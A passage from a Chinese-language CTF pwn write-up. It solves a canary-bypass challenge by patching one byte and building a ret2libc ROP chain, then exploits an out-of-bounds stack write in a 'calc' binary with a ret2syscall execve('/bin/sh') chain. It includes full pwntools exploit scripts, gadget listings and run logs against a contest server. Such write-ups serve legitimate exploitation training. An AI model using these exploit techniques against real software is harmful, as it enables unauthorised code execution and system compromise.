.text:00000000000011BD                    ; __unwind {
.text:00000000000011BD 000 F3 0F 1E FA                    endbr64
.text:00000000000011C1 000 55                             push    rbp
.text:00000000000011C2 008 48 89 E5                       mov     rbp, rsp
.text:00000000000011C5 008 48 83 EC 60                    sub     rsp, 60h
.text:00000000000011C9 068 64 48 8B 04 25                 mov     rax, fs:28h
.text:00000000000011C9 068 28 00 00 00
.text:00000000000011D2 068 48 89 45 F8                    mov     [rbp+var_8], rax
.text:00000000000011D6 068 31 C0                          xor     eax, eax
.text:00000000000011D8 068 48 8D 05 41 0E                 lea     rax, msg_0      ; "Haha, you can never bypass canary!"
.text:00000000000011D8 068 00 00
.text:00000000000011DF 068 48 89 C7                       mov     rdi, rax        ; s
.text:00000000000011E2 068 E8 89 FE FF FF                 call    _puts
.text:00000000000011E7 068 48 8D 45 A0                    lea     rax, [rbp+buf]
.text:00000000000011EB 068 BA F0 00 00 00                 mov     edx, 0F0h       ; nbytes
.text:00000000000011F0 068 48 89 C6                       mov     rsi, rax        ; buf
.text:00000000000011F3 068 BF 00 00 00 00                 mov     edi, 0          ; fd
.text:00000000000011F8 068 E8 93 FE FF FF                 call    _read
.text:00000000000011FD 068 B8 00 00 00 00                 mov     eax, 0
.text:0000000000001202 068 48 8B 55 F8                    mov     rdx, [rbp+var_8]
.text:0000000000001206 068 64 48 2B 14 25                 sub     rdx, fs:28h
.text:0000000000001206 068 28 00 00 00
.text:000000000000120F 068 74 05                          jz      short locret_1216
.text:0000000000001211 068 E8 6A FE FF FF                 call    ___stack_chk_fail
.text:0000000000001216                    ; ---------------------------------------------------------------------------
.text:0000000000001216
.text:0000000000001216                    locret_1216:                            ; CODE XREF: main+52↑j
.text:0000000000001216 068 C9                             leave
.text:0000000000001217 000 C3                             retn
.text:0000000000001217                    ; } // starts at 11BD
.text:0000000000001217                    main            endp
```

```asm
.text:000000000000120F 068 74 05                          jz      short locret_1216
```

这里的 jz 对应 0x74 ，根据上下文这是决定 canary 匹配错误是否跳转的关键指令。

现在的逻辑是如果匹配则跳转 ret。

我们只需要将 jz 修改为 jnz 也就是将程序基址偏移 0x120F 处的一个字节从 0x74 改为 0x75 即可。

随后附件中给出了 libc 文件，那么相比这题就是 ret2libc了。

我们可以先手动 patch 在本地测试一下：

![](https://img.halfcity.top/2026/11/11/ff2a04e6ef61747f09633ae8dbdbe803.avif)

先手动解析基址，然后利用 libc 中的 gadget 完成 ret2system 的 ROP 链。

exp 如下：

```py
#!/usr/bin/env python3
import os
from pwn import *

exe  = ELF("./pwn_patched")
HERE = os.path.dirname(os.path.abspath(__file__))
libc = ELF(os.path.join(HERE, 'libc.so.6'), checksec=False)

context.binary  = exe
context.arch    = "amd64"
context.log_level = "debug"
context.gdb_binary = "pwndbg"

PATCH_OFF = 0x120F

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, """
                set follow-fork-mode parent
                b *0x120F
                c
            """)
    else:
        r = remote("addr", 1337)
    return r


def get_libc_base(pid):
    addrs = []
    with open(f"/proc/{pid}/maps", "r") as f:
        for line in f:
            if 'libc.so.6' in line:
                start = int(line.split('-', 1)[0], 16)
                addrs.append(start)
    if not addrs:
        raise RuntimeError("libc not found in maps")
    return min(addrs)


def main():
    io = conn()

    io.recvline_contains(b"canary")
    libc_base = get_libc_base(io.pid)
    log.success("libc base = %#x", libc_base)
    
    leak = io.pid and open(f"/proc/{io.pid}/mem", "rb", 0)
    try:
        leak.seek(libc_base)
        magic = leak.read(4)
        log.info("libc[base:base+4] = %s", magic)
        assert magic == b"\x7fELF", "libc base looks wrong!"
    except Exception as e:
        log.warning("mem check skipped: %s", e)
    
    pop_rdi = libc_base + next(libc.search(asm("pop rdi; ret")))
    ret     = pop_rdi + 1
    bin_sh  = libc_base + next(libc.search(b"/bin/sh\x00"))
    system  = libc_base + libc.symbols["system"]
    
    log.info('pop_rdi=%#x ret=%#x /bin/sh=%#x system=%#x',
             pop_rdi, ret, bin_sh, system)
    
    payload  = b"A" * 88
    payload += b"B" * 8
    payload += b"C" * 8
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
    payload += p64(system)
    
    io.send(payload)
    
    io.interactive()


if __name__ == "__main__":
    main()
```

经测试，exp 正常运行。

接下来我们将 payload 构造的部分填入题目给的模版：

```py
#!/usr/bin/env python3
# cosmic-ray 解题模板
# 用法: python3 solve.py [remote|local] [host] [port]
import os
import re
import sys
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
context.timeout = 15

HERE = os.path.dirname(os.path.abspath(__file__))

MODE = sys.argv[1] if len(sys.argv) > 1 else 'local'
HOST = sys.argv[2] if len(sys.argv) > 2 else '110.42.112.160'
PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 45755

# 每轮: (patch 文件偏移, 单字节, 自定义类型)
ROUNDS = [
    (0x120F, 0x75, 'bypass_canary')
]

libc = ELF(os.path.join(HERE, 'libc.so.6'), checksec=False)

def build_payload(kind, libc_base):
    pop_rdi = libc_base + next(libc.search(asm("pop rdi; ret")))
    ret     = pop_rdi + 1
    bin_sh  = libc_base + next(libc.search(b"/bin/sh\x00"))
    system  = libc_base + libc.symbols["system"]

    log.info('pop_rdi=%#x ret=%#x /bin/sh=%#x system=%#x', pop_rdi, ret, bin_sh, system)
    
    payload = b"A" * 88
    payload += b"B" * 8
    payload += b"C" * 8
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
    payload += p64(system)
    
    payload = payload.ljust(240, b"\x90")
    
    payload += b'cat flag\n'
    
    return payload


def start():
    if MODE == 'remote':
        return remote(HOST, PORT)
    env = dict(os.environ)
    env['ROUND'] = str(1)
    env['BLOCK_LIMIT'] = str(0)
    return process(['python3', 'chal.py'], cwd=HERE, env=env)


def main():
    p = start()

    for idx, (off, byte, kind) in enumerate(ROUNDS, 1):
        p.recvuntil(b'location (hex file offset): ')
        p.sendline(hex(off).encode())
    
        p.recvuntil(b'machine code (hex byte): ')
        p.sendline(hex(byte).encode())
    
        data = p.recvuntil(b'Enter exp (hex): ')
        libc_base = None
        for line in data.split(b'\n'):
            if b'libc.so.6' in line:
                libc_base = int(line.split(b'-')[0], 16)
                break
        assert libc_base is not None, 'libc base not found'
        log.success('[%d/%d] patch %#x -> %#x  (%s)  libc=%#x'
                    % (idx, len(ROUNDS), off, byte, kind, libc_base))
    
        p.sendline(build_payload(kind, libc_base).hex().encode())
    
    out = p.recvall(timeout=10)
    m = re.search(rb'flag\{[^}]*\}', out)
    if m and b'Well Done' in out:
        log.success('flag = %s' % m.group().decode())
    else:
        log.failure('failed')
        print(out.decode(errors='replace')[-300:])


main()
```

输出如下：

```bash
❯ python solve.py remote
[+] Opening connection to 110.42.112.160 on port 45755: Done
[DEBUG] Received 0x2e bytes:
    b'[1/1] Enter patch location (hex file offset): '
[DEBUG] Sent 0x7 bytes:
    b'0x120f\n'
[DEBUG] Received 0x2b bytes:
    b'[1/1] Enter patch machine code (hex byte): '
[DEBUG] Sent 0x5 bytes:
    b'0x75\n'
[DEBUG] Received 0x84a bytes:
    b'562c21cec000-562c21ced000 r--p 00000000 00:58a 4589256                   /home/ctf/pwn_patched_0\n'
    b'562c21ced000-562c21cee000 r-xp 00001000 00:58a 4589256                   /home/ctf/pwn_patched_0\n'
    b'562c21cee000-562c21cef000 r--p 00002000 00:58a 4589256                   /home/ctf/pwn_patched_0\n'
    b'562c21cef000-562c21cf0000 r--p 00002000 00:58a 4589256                   /home/ctf/pwn_patched_0\n'
    b'562c21cf0000-562c21cf1000 rw-p 00003000 00:58a 4589256                   /home/ctf/pwn_patched_0\n'
    b'562c33491000-562c334b2000 rw-p 00000000 00:00 0                          [heap]\n'
    b'7f2bb52f2000-7f2bb52f5000 rw-p 00000000 00:00 0 \n'
    b'7f2bb52f5000-7f2bb531d000 r--p 00000000 00:58a 3952640                   /usr/lib/x86_64-linux-gnu/libc.so.6\n'
    b'7f2bb531d000-7f2bb54a6000 r-xp 00028000 00:58a 3952640                   /usr/lib/x86_64-linux-gnu/libc.so.6\n'
    b'7f2bb54a6000-7f2bb54f5000 r--p 001b1000 00:58a 3952640                   /usr/lib/x86_64-linux-gnu/libc.so.6\n'
    b'7f2bb54f5000-7f2bb54f9000 r--p 001ff000 00:58a 3952640                   /usr/lib/x86_64-linux-gnu/libc.so.6\n'
    b'7f2bb54f9000-7f2bb54fb000 rw-p 00203000 00:58a 3952640                   /usr/lib/x86_64-linux-gnu/libc.so.6\n'
    b'7f2bb54fb000-7f2bb5508000 rw-p 00000000 00:00 0 \n'
    b'7f2bb550b000-7f2bb550d000 rw-p 00000000 00:00 0 \n'
    b'7f2bb550d000-7f2bb5511000 r--p 00000000 00:00 0                          [vvar]\n'
    b'7f2bb5511000-7f2bb5513000 r-xp 00000000 00:00 0                          [vdso]\n'
    b'7f2bb5513000-7f2bb5514000 r--p 00000000 00:58a 3952620                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n'
    b'7f2bb5514000-7f2bb553f000 r-xp 00001000 00:58a 3952620                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n'
    b'7f2bb553f000-7f2bb5549000 r--p 0002c000 00:58a 3952620                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n'
    b'7f2bb5549000-7f2bb554b000 r--p 00036000 00:58a 3952620                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n'
    b'7f2bb554b000-7f2bb554d000 rw-p 00038000 00:58a 3952620                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n'
    b'7ffe49997000-7ffe499b8000 rw-p 00000000 00:00 0                          [stack]\n'
    b'\n'
    b'[1/1] Enter exp (hex): '
[+] [1/1] patch 0x120f -> 0x75  (bypass_canary)  libc=0x7f2bb52f5000
[DEBUG] cpp -Wno-unused-command-line-argument -C -nostdinc -undef -P -I/usr/lib/python3/dist-packages/pwnlib/data/includes
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
    pop rdi; ret
[DEBUG] Using cached assembly output from '/home/halfcity/.cache/.pwntools-cache-3.13/asm-cache/43199008abdbe03d62af31e73430145d50b6d333'
[*] pop_rdi=0x7f2bb540108d ret=0x7f2bb540108e /bin/sh=0x7f2bb54c142f system=0x7f2bb534d750
[DEBUG] Sent 0x1f3 bytes:
    b'41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141424242424242424243434343434343438e1040b52b7f00008d1040b52b7f00002f144cb52b7f000050d734b52b7f0000909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909063617420666c61670a\n'
[+] Receiving all data: Done (60B)
[DEBUG] Received 0x3c bytes:
    b'Well Done.\n'
    b"b'flag{0ne_byTe-can_m@Ke_4_dIFFerEnce-45ce1b}\\n'\n"
[*] Closed connection to 110.42.112.160 port 45755
[+] flag = flag{0ne_byTe-can_m@Ke_4_dIFFerEnce-45ce1b}
```

```txt
flag{0ne_byTe-can_m@Ke_4_dIFFerEnce-45ce1b}
```

### calc...不对，这不是2025年

简单修复一下指针类型并重命名，随后分析。

![](https://img.halfcity.top/2026/11/11/1ec53780b666bda9efcf14fc86aab87c.avif)

给人的感觉像是一个 vm？不过这是一个 pwn 题。

read_decimal 确保读取到一个十进制数字。

传入到每一个 handler 的 slots 参数都是指针，slots 来自上一个栈帧。

![](https://img.halfcity.top/2026/11/11/5db20b03ab018cbb3db45bacd0be77af.avif)

由于没有对下标进行限制，通过下标，edit 功能可以越界直接对本函数的栈帧进行改写。

execve 需要三个参数，根据 ABI，他们分别需要在 rdi rsi rdx。

让我们找找有没有可以用的 gadget：

```bash
❯ ROPgadget --binary calc
Gadgets information
============================================================
0x00000000004010e8 : adc byte ptr [rax + 0x40], al ; add bh, bh ; loopne 0x401155 ; nop ; ret
0x000000000040143f : adc byte ptr [rax + 1], bh ; leave ; ret
0x0000000000401077 : add al, 0 ; add byte ptr [rax], al ; jmp 0x401020
0x000000000040155c : add al, 0x90 ; jmp 0x401561
0x000000000040163a : add al, 0x90 ; jmp 0x40163f
0x0000000000401718 : add al, 0x90 ; jmp 0x40171d
0x00000000004017f7 : add al, 0x90 ; jmp 0x4017fc
0x0000000000401771 : add al, bpl ; jmp 0xffffffff8a401775
0x0000000000401597 : add al, bpl ; ret
0x0000000000401057 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020
0x0000000000401772 : add al, ch ; jmp 0xffffffff8a401775
0x0000000000401598 : add al, ch ; ret
0x00000000004010eb : add bh, bh ; loopne 0x401155 ; nop ; ret
0x0000000000401298 : add bh, byte ptr [rax + 1] ; leave ; ret
0x000000000040119e : add byte ptr [rax - 0x77], cl ; ret 0x40be
0x000000000040116c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; jmp 0x401100
0x0000000000401037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401020
0x0000000000401279 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40129e
0x000000000040142f : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401445
0x0000000000401498 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4014cd
0x000000000040180d : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401842
0x000000000040185b : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401880
0x00000000004010b8 : add byte ptr [rax], al ; add byte ptr [rax], al ; nop dword ptr [rax] ; ret
0x0000000000401a4d : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040129b : add byte ptr [rax], al ; add cl, cl ; ret
0x000000000040115a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040134d : add byte ptr [rax], al ; add qword ptr [rbp - 8], 2 ; jmp 0x4013da
0x000000000040116e : add byte ptr [rax], al ; endbr64 ; jmp 0x401100
0x0000000000401039 : add byte ptr [rax], al ; jmp 0x401020
0x000000000040127b : add byte ptr [rax], al ; jmp 0x40129e
0x0000000000401431 : add byte ptr [rax], al ; jmp 0x401445
0x000000000040149a : add byte ptr [rax], al ; jmp 0x4014cd
0x000000000040180f : add byte ptr [rax], al ; jmp 0x401842
0x000000000040185d : add byte ptr [rax], al ; jmp 0x401880
0x000000000040129c : add byte ptr [rax], al ; leave ; ret
0x00000000004010ba : add byte ptr [rax], al ; nop dword ptr [rax] ; ret
0x0000000000401a4f : add byte ptr [rax], al ; pop rbp ; ret
0x0000000000401034 : add byte ptr [rax], al ; push 0 ; jmp 0x401020
0x0000000000401044 : add byte ptr [rax], al ; push 1 ; jmp 0x401020
0x0000000000401054 : add byte ptr [rax], al ; push 2 ; jmp 0x401020
0x0000000000401064 : add byte ptr [rax], al ; push 3 ; jmp 0x401020
0x0000000000401074 : add byte ptr [rax], al ; push 4 ; jmp 0x401020
0x0000000000401084 : add byte ptr [rax], al ; push 5 ; jmp 0x401020
0x0000000000401009 : add byte ptr [rax], al ; test rax, rax ; je 0x401012 ; call rax
0x0000000000401275 : add byte ptr [rbp + 7], dh ; mov eax, 0 ; jmp 0x40129e
0x000000000040142b : add byte ptr [rbp + 7], dh ; mov eax, 0 ; jmp 0x401445
0x000000000040115b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401159 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040129d : add cl, cl ; ret
0x00000000004010ea : add dil, dil ; loopne 0x401155 ; nop ; ret
0x0000000000401047 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x401020
0x000000000040129a : add dword ptr [rax], eax ; add byte ptr [rax], al ; leave ; ret
0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040120e : add dword ptr [rbp - 8], 1 ; jmp 0x40125c
0x0000000000401350 : add dword ptr [rbp - 8], 2 ; jmp 0x4013da
0x0000000000401841 : add dword ptr [rbx + 0x7e07fc7d], eax ; retf
0x00000000004014c7 : add eax, 0x1b8 ; add cl, cl ; ret
0x0000000000401157 : add eax, 0x2edb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401067 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020
0x0000000000401013 : add esp, 8 ; ret
0x000000000040120d : add qword ptr [rbp - 8], 1 ; jmp 0x40125c
0x000000000040134f : add qword ptr [rbp - 8], 2 ; jmp 0x4013da
0x0000000000401012 : add rsp, 8 ; ret
0x000000000040188f : call qword ptr [rax + 0x4855c3c9]
0x0000000000401010 : call rax
0x000000000040180c : cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401842
0x000000000040185a : cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401880
0x0000000000401840 : cld ; add dword ptr [rbx + 0x7e07fc7d], eax ; retf
0x0000000000401173 : cli ; jmp 0x401100
0x000000000040121b : cmp al, 0x2b ; jne 0x40125c ; add qword ptr [rbp - 8], 1 ; jmp 0x40125c
0x0000000000401842 : cmp dword ptr [rbp - 4], 7 ; jle 0x401813 ; nop ; nop ; leave ; ret
0x0000000000401170 : endbr64 ; jmp 0x401100
0x0000000000401158 : fld xword ptr [rsi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040188d : idiv edi ; call qword ptr [rax + 0x4855c3c9]
0x000000000040142a : in al, dx ; add byte ptr [rbp + 7], dh ; mov eax, 0 ; jmp 0x401445
0x00000000004011fa : iretd
0x0000000000401062 : jb 0x401093 ; add byte ptr [rax], al ; push 3 ; jmp 0x401020
0x000000000040100e : je 0x401012 ; call rax
0x00000000004010e5 : je 0x4010f0 ; mov edi, 0x404010 ; jmp rax
0x0000000000401127 : je 0x401130 ; mov edi, 0x404010 ; jmp rax
0x0000000000401808 : jge 0x4017f2 ; mov dword ptr [rbp - 4], 0 ; jmp 0x401842
0x0000000000401856 : jge 0x401840 ; mov dword ptr [rbp - 4], 0 ; jmp 0x401880
0x000000000040176f : jl 0x401791 ; add al, bpl ; jmp 0xffffffff8a401775
0x0000000000401846 : jle 0x401813 ; nop ; nop ; leave ; ret
0x000000000040103b : jmp 0x401020
0x0000000000401174 : jmp 0x401100
0x00000000004011c8 : jmp 0x4011cf
0x0000000000401212 : jmp 0x40125c
0x000000000040128c : jmp 0x401292
0x000000000040127d : jmp 0x40129e
0x00000000004012eb : jmp 0x4012f2
0x000000000040137f : jmp 0x4013b9
0x0000000000401354 : jmp 0x4013da
0x0000000000401433 : jmp 0x401445
0x000000000040149c : jmp 0x4014cd
0x000000000040155b : jmp 0x401561
0x0000000000401636 : jmp 0x40163f
0x0000000000401714 : jmp 0x40171d
0x00000000004017f3 : jmp 0x4017fc
0x0000000000401811 : jmp 0x401842
0x000000000040185f : jmp 0x401880
0x0000000000401947 : jmp 0x4018b9
0x00000000004019f3 : jmp 0x401a05
0x0000000000401774 : jmp 0xffffffff8a401775
0x00000000004010ec : jmp rax
0x00000000004011b4 : jne 0x4011c0 ; mov eax, 0 ; jmp 0x40129e
0x000000000040121d : jne 0x40125c ; add qword ptr [rbp - 8], 1 ; jmp 0x40125c
0x0000000000401276 : jne 0x40127f ; mov eax, 0 ; jmp 0x40129e
0x00000000004012d7 : jne 0x4012e3 ; mov eax, 0 ; jmp 0x401445
0x000000000040142c : jne 0x401435 ; mov eax, 0 ; jmp 0x401445
0x0000000000401495 : jne 0x40149e ; mov eax, 0 ; jmp 0x4014cd
0x0000000000401283 : jns 0x40128e ; mov rax, qword ptr [rbp - 0x10] ; neg rax ; jmp 0x401292
0x0000000000401052 : jp 0x401083 ; add byte ptr [rax], al ; push 2 ; jmp 0x401020
0x000000000040129e : leave ; ret
0x00000000004010ed : loopne 0x401155 ; nop ; ret
0x0000000000401156 : mov byte ptr [rip + 0x2edb], 1 ; pop rbp ; ret
0x0000000000401032 : mov ch, byte ptr [rdi] ; add byte ptr [rax], al ; push 0 ; jmp 0x401020
0x000000000040143e : mov dword ptr [rax], edx ; mov eax, 1 ; leave ; ret
0x000000000040137c : mov dword ptr [rbp - 0x18], eax ; jmp 0x4013b9
0x000000000040180a : mov dword ptr [rbp - 4], 0 ; jmp 0x401842
0x0000000000401858 : mov dword ptr [rbp - 4], 0 ; jmp 0x401880
0x00000000004011c1 : mov dword ptr [rbp - 8], 0x404040 ; jmp 0x4011cf
0x00000000004012e4 : mov dword ptr [rbp - 8], 0x404040 ; jmp 0x4012f2
0x0000000000401297 : mov dword ptr [rdx], eax ; mov eax, 1 ; leave ; ret
0x0000000000401278 : mov eax, 0 ; jmp 0x40129e
0x000000000040142e : mov eax, 0 ; jmp 0x401445
0x0000000000401497 : mov eax, 0 ; jmp 0x4014cd
0x0000000000401a4c : mov eax, 0 ; pop rbp ; ret
0x00000000004014c1 : mov eax, 0xffffffff ; jmp 0x4014cd
0x0000000000401299 : mov eax, 1 ; leave ; ret
0x000000000040134b : mov eax, dword ptr [rax] ; add byte ptr [rax], al ; add qword ptr [rbp - 8], 2 ; jmp 0x4013da
0x0000000000401286 : mov eax, dword ptr [rbp - 0x10] ; neg rax ; jmp 0x401292
0x00000000004010e7 : mov edi, 0x404010 ; jmp rax
0x0000000000401377 : mov esi, 0x30e883c0 ; mov dword ptr [rbp - 0x18], eax ; jmp 0x4013b9
0x000000000040139f : mov esi, 0x57e883c0 ; mov dword ptr [rbp - 0x18], eax ; jmp 0x4013b9
0x000000000040143d : mov qword ptr [rax], rdx ; mov eax, 1 ; leave ; ret
0x00000000004011c0 : mov qword ptr [rbp - 8], 0x404040 ; jmp 0x4011cf
0x00000000004012e3 : mov qword ptr [rbp - 8], 0x404040 ; jmp 0x4012f2
0x0000000000401296 : mov qword ptr [rdx], rax ; mov eax, 1 ; leave ; ret
0x0000000000401285 : mov rax, qword ptr [rbp - 0x10] ; neg rax ; jmp 0x401292
0x0000000000401376 : movsx eax, al ; sub eax, 0x30 ; mov dword ptr [rbp - 0x18], eax ; jmp 0x4013b9
0x000000000040139e : movsx eax, al ; sub eax, 0x57 ; mov dword ptr [rbp - 0x18], eax ; jmp 0x4013b9
0x000000000040128a : neg eax ; jmp 0x401292
0x0000000000401289 : neg rax ; jmp 0x401292
0x000000000040155d : nop ; jmp 0x401561
0x0000000000401638 : nop ; jmp 0x40163f
0x0000000000401716 : nop ; jmp 0x40171d
0x00000000004017f5 : nop ; jmp 0x4017fc
0x0000000000401560 : nop ; leave ; ret
0x0000000000401848 : nop ; nop ; leave ; ret
0x00000000004010ef : nop ; ret
0x0000000000401449 : nop ; ud2 ; pop rdi ; ret
0x0000000000401453 : nop ; ud2 ; pop rdx ; ret
0x000000000040144e : nop ; ud2 ; pop rsi ; ret
0x0000000000401458 : nop ; ud2 ; syscall
0x00000000004010bc : nop dword ptr [rax] ; ret
0x00000000004011b5 : or bh, byte ptr [rax] ; jmp 0x40129e
0x00000000004012d8 : or bh, byte ptr [rax] ; jmp 0x401445
0x00000000004010e6 : or dword ptr [rdi + 0x404010], edi ; jmp rax
0x000000000040144b : or ebx, dword ptr [rdi - 0x3d] ; nop ; ud2 ; pop rsi ; ret
0x0000000000401455 : or ebx, dword ptr [rdx - 0x3d] ; nop ; ud2 ; syscall
0x0000000000401450 : or ebx, dword ptr [rsi - 0x3d] ; nop ; ud2 ; pop rdx ; ret
0x00000000004012be : outsb dx, byte ptr [rsi] ; sub eax, 0x89480000 ; ret 0x40be
0x0000000000401447 : pop rax ; ret
0x000000000040115d : pop rbp ; ret
0x000000000040144c : pop rdi ; ret
0x0000000000401456 : pop rdx ; ret
0x0000000000401451 : pop rsi ; ret
0x0000000000401036 : push 0 ; jmp 0x401020
0x0000000000401072 : push 0x2f ; add byte ptr [rax], al ; push 4 ; jmp 0x401020
0x0000000000401046 : push 1 ; jmp 0x401020
0x0000000000401056 : push 2 ; jmp 0x401020
0x0000000000401066 : push 3 ; jmp 0x401020
0x0000000000401076 : push 4 ; jmp 0x401020
0x0000000000401086 : push 5 ; jmp 0x401020
0x00000000004013a3 : push rdi ; mov dword ptr [rbp - 0x18], eax ; jmp 0x4013b9
0x0000000000401016 : ret
0x00000000004011a1 : ret 0x40be
0x00000000004013c3 : ret 0x458b
0x00000000004017c3 : ret 0x8948
0x0000000000401239 : ret 0x8b48
0x0000000000401847 : retf
0x0000000000401606 : retf 0x8948
0x0000000000401378 : rol byte ptr [rbx + 0x458930e8], 0xe8 ; jmp 0x4013b9
0x00000000004013a0 : rol byte ptr [rbx + 0x458957e8], 0xe8 ; jmp 0x4013b9
0x00000000004011b3 : sal byte ptr [rbp + 0xa], 0xb8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40129e
0x00000000004012d6 : sal byte ptr [rbp + 0xa], 0xb8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401445
0x0000000000401494 : sal byte ptr [rbp + 7], 0xb8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4014cd
0x000000000040100d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x00000000004017c2 : scasd eax, dword ptr [rdi] ; ret 0x8948
0x0000000000401379 : sub eax, 0x30 ; mov dword ptr [rbp - 0x18], eax ; jmp 0x4013b9
0x00000000004013a1 : sub eax, 0x57 ; mov dword ptr [rbp - 0x18], eax ; jmp 0x4013b9
0x00000000004012bf : sub eax, 0x89480000 ; ret 0x40be
0x000000000040121c : sub esi, dword ptr [rbp + 0x3d] ; add qword ptr [rbp - 8], 1 ; jmp 0x40125c
0x0000000000401a55 : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000401a54 : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040145b : syscall
0x000000000040100c : test eax, eax ; je 0x401012 ; call rax
0x00000000004010e3 : test eax, eax ; je 0x4010f0 ; mov edi, 0x404010 ; jmp rax
0x0000000000401125 : test eax, eax ; je 0x401130 ; mov edi, 0x404010 ; jmp rax
0x00000000004011b2 : test eax, eax ; jne 0x4011c0 ; mov eax, 0 ; jmp 0x40129e
0x00000000004012d5 : test eax, eax ; jne 0x4012e3 ; mov eax, 0 ; jmp 0x401445
0x0000000000401493 : test eax, eax ; jne 0x40149e ; mov eax, 0 ; jmp 0x4014cd
0x000000000040100b : test rax, rax ; je 0x401012 ; call rax
0x000000000040144a : ud2 ; pop rdi ; ret
0x0000000000401454 : ud2 ; pop rdx ; ret
0x000000000040144f : ud2 ; pop rsi ; ret
0x0000000000401459 : ud2 ; syscall

Unique gadgets found: 208
```

可以用的 gadget 非常多，我们筛选一下：

```bash
❯ ROPgadget --binary calc | grep "pop rsi ; ret"
0x000000000040144e : nop ; ud2 ; pop rsi ; ret
0x000000000040144b : or ebx, dword ptr [rdi - 0x3d] ; nop ; ud2 ; pop rsi ; ret
0x0000000000401451 : pop rsi ; ret
0x000000000040144f : ud2 ; pop rsi ; ret

❯ ROPgadget --binary calc | grep "pop rdx ; ret"
0x0000000000401453 : nop ; ud2 ; pop rdx ; ret
0x0000000000401450 : or ebx, dword ptr [rsi - 0x3d] ; nop ; ud2 ; pop rdx ; ret
0x0000000000401456 : pop rdx ; ret
0x0000000000401454 : ud2 ; pop rdx ; ret

❯ ROPgadget --binary calc | grep "pop rax ; ret"
0x0000000000401447 : pop rax ; ret

❯ ROPgadget --binary calc | grep "syscall"
0x0000000000401458 : nop ; ud2 ; syscall
0x0000000000401455 : or ebx, dword ptr [rdx - 0x3d] ; nop ; ud2 ; syscall
0x000000000040145b : syscall
0x0000000000401459 : ud2 ; syscall

❯ ROPgadget --binary calc --string "/bin/sh"
Strings information
============================================================
0x0000000000402010 : /bin/sh
```

非常好，这里的 gadget 是标准的可以用于 ret2syscall 的 gadget。

我们可以将 edit() 封装一下，然后构造好 ret2syscall 的栈参数随后输入一个非法的字符触发 ret，进入预期的 ROP 链。

exp 如下：

```py
from pwn import *

exe = ELF("./calc")

context.binary = exe
context.arch = "amd64"
context.gdb_binary = "pwndbg"
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("110.42.112.160", 30672)

    return r

io = conn()

def send(data):
    global io

    log.info(f"sending payload: {data}")
    io.send(data)
    log.success("payload sent")

def sendline(data):
    global io

    log.info(f"sending payload: {data}")
    io.sendline(data)
    log.success("payload sent")

def interactive():
    global io

    log.info("try to interactive with target...")
    io.interactive()

def edit(index, value):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"index: ", str(index).encode())
    io.sendlineafter(b"value (hex): ", hex(value).encode())
    io.recvuntil(b"updated\n")

def main():
    global io

    pop_rdi  = 0x40144c
    pop_rsi  = 0x401451
    pop_rdx  = 0x401456
    pop_rax  = 0x401447
    syscall  = 0x40145b
    bin_sh   = 0x402010
    
    edit(9,  pop_rdi)      # pop rdi; ret
    edit(10, bin_sh)       # /bin/sh
    edit(11, pop_rsi)      # pop rsi; ret
    edit(12, 0)            # rsi = 0
    edit(13, pop_rdx)      # pop rdx; ret
    edit(14, 0)            # rdx = 0
    edit(15, pop_rax)      # pop rax; ret
    edit(16, 59)           # rax = 59 (execve)
    edit(17, syscall)      # syscall
    
    io.recvuntil(b"> ")
    
    send(b"a")
    
    interactive()

if __name__ == "__main__":
    main()
```

输出如下：

```bash
❯ python exp.py
[*] '/home/halfcity/Desktop/calc'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Opening connection to 110.42.112.160 on port 30672: Done
